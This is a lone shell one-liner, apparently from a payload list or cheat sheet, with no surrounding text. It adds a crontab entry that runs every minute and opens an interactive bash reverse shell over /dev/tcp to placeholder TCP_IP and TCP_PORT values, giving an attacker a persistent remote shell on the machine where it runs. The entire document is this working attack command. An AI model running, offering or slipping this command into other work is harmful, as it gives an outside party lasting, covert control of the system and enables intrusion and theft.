(crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/TCP_IP/TCP_PORT 0>&1") | crontab -
